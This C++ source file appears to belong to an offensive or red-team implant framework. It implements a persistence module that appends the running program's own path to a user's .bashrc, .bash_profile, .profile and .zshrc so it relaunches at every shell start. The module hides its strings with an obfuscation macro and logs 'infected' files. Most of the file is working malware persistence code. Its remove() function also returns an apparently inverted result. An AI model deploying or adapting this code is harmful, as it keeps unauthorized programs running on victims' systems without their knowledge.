#include "modules/persistence/RunControl.hpp"
#include "utils/Logger.hpp"
#include "utils/FileUtils.hpp"
#include "utils/SystemUtils.hpp"
#include "utils/Obfuscation.hpp"
#include <filesystem>
#include <vector>

// TODO: add one-and-done option -> one successful rc persistence and return

RunControlMethod::RunControlMethod() {
    std::string currentProc = SystemUtils::GetProcessPath();
    this->payload = currentProc + OBFL(" &");

    #ifdef IMPACT_LEVEL_TEST
        targets.push_back({OBFL(".ghost_rc"), false});
    #elif defined(IMPACT_LEVEL_USER) || defined(IMPACT_LEVEL_SYSTEM)
        targets.push_back({OBFL(".bashrc"), false});
        targets.push_back({OBFL(".bash_profile"), false});
        targets.push_back({OBFL(".profile"), false});
        targets.push_back({OBFL(".zshrc"), false});
    #endif
}

bool RunControlMethod::install() {
    std::string home(SystemUtils::GetUserHome());

    LOG_INFO("Attempting RunControl persistence")

    #ifdef IMPACT_LEVEL_TEST
    if (!std::filesystem::exists(home + "/" + targets[0].first)) {
        FileUtils::WriteFile(home + "/" + targets[0].first, payload);
    }
    #endif

    int successCount = 0;
    for (auto& [target, established] : this->targets) {
        if (established) {
            successCount++;
            continue;
        }

        std::string path = home + "/" + target;

        if (!std::filesystem::exists(path)) {
            LOG_INFO("Skipping {} (file not found)", path)
            continue;
        }

        LOG_INFO("Attempting persistence on {}", path)
        if (FileUtils::AppendToFile(path, payload)) {
            LOG_SUCCESS("Persistence established in {}", path)
            established = true;
            successCount++;
        } else {
            LOG_ERROR("Error appending payload {} to file {}", payload, target)
        }
    }

    if (successCount > 0) {
        LOG_SUCCESS("[SUMMARY] Infected {} rc files", successCount)
    } else {
        LOG_ERROR("[SUMMARY] Failed to infect any rc files")
    }

    return successCount > 0;
}

bool RunControlMethod::remove() {
    std::string home(SystemUtils::GetUserHome());

    LOG_INFO("Removing RunControl persistence")

    int removedCount = 0;
    for (auto& [target, established] : this->targets) {
        if (!established) continue;

        std::string path = home + "/" + target;

        if (!std::filesystem::exists(path)) {
            LOG_INFO("Skipping {} (file not found)", path)
            continue;
        }

        LOG_INFO("Attempting to remove persistence from {}", path)
        if (FileUtils::RemoveFromFile(path, payload)) {
            LOG_SUCCESS("Persistence removed from {}", path)
            established = false;
            removedCount++;
        } else {
            LOG_ERROR("Error removing payload {} from file {}", payload, target)
        }
    }

    if (removedCount > 0) {
        LOG_SUCCESS("[SUMMARY] Restored {} rc files", removedCount)
    } else {
        LOG_ERROR("[SUMMARY] Failed to restore any rc files")
    }

    return !(removedCount > 0); // TODO: when TODO in lines 5-6 is implemented, return removedCount == infectedCount or smth like this
}